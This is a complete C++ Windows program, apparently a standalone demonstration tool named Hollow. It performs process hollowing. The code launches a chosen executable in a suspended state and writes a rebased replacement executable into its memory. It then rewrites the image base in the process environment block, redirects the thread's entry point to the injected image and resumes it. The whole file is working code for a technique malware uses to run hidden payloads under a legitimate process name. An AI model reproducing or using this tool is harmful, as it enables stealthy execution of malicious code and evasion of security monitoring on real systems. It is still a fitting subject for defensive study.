// Hollow.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <iostream>
#include <ImageHlp.h>
#include <winternl.h>
#include <Psapi.h>
#include <assert.h>

#pragma comment(lib, "imagehlp")
#pragma comment(lib, "ntdll")

PROCESS_INFORMATION pi;

int err(const char* msg) {
    printf("%s (%u)\n", msg, GetLastError());
    if (pi.hProcess)
        TerminateProcess(pi.hProcess, 0);
    return 1;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: Hollow <image_name> <replacement_exe>\n");
        return 0;
    }

    auto name = argv[1];
    auto replace = argv[2];

    STARTUPINFOA si = { sizeof(si) };
    if (!CreateProcessA(nullptr, name, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        return err("Failed to create process");

    printf("Created PID: %u\n", pi.dwProcessId);

    WCHAR path[MAX_PATH];
    GetModuleFileName(nullptr, path, _countof(path));
    *wcsrchr(path, L'\\') = 0;
    SetCurrentDirectory(path);

    HANDLE hFile = CreateFileA(replace, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
        return err("Failed to open file");
    
    PVOID newAddress = VirtualAllocEx(pi.hProcess, nullptr,
        GetFileSize(hFile, nullptr) + (1 << 20),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newAddress)
        return err("Failed to allocate memmory");

    printf("Address in target process: 0x%p\n", newAddress);

    ULONG orgSize, newSize;
    ULONG64 oldImageBase, newImageBase = (ULONG64)newAddress;

    if (!ReBaseImage64(replace, nullptr, TRUE, FALSE, FALSE, 0, &orgSize, &oldImageBase, &newSize, &newImageBase, 0))
        return err("Failed to rebase image");

    HANDLE hMemFile = CreateFileMapping(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMemFile)
        return err("Failed to create MMF");

    CloseHandle(hFile);

    PVOID address = MapViewOfFileEx(hMemFile, FILE_MAP_READ, 0, 0, 0, newAddress);
    if (!address)
        return err("Failed to map in requested address");

    auto dosHeader = (PIMAGE_DOS_HEADER)address;
    auto nt = (PIMAGE_NT_HEADERS)((BYTE*)address + dosHeader->e_lfanew);
    auto sections = (PIMAGE_SECTION_HEADER)(nt + 1);

    SIZE_T written;
    WriteProcessMemory(pi.hProcess, (PVOID)newAddress, (PVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfHeaders, &written);

    for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            PVOID((PBYTE)newAddress + sections[i].VirtualAddress),
            PVOID(sections[i].PointerToRawData + nt->OptionalHeader.ImageBase), 
            sections[i].SizeOfRawData, &written);
    }

    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
    PVOID peb = pbi.PebBaseAddress;

    WriteProcessMemory(pi.hProcess, (PBYTE)peb + sizeof(PVOID) * 2,
        &nt->OptionalHeader.ImageBase, sizeof(PVOID), &written);

    CONTEXT context;
    context.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi.hThread, &context);

    context.Rcx = (DWORD64)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD64)newAddress);

    SetThreadContext(pi.hThread, &context);

    UnmapViewOfFile(address);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
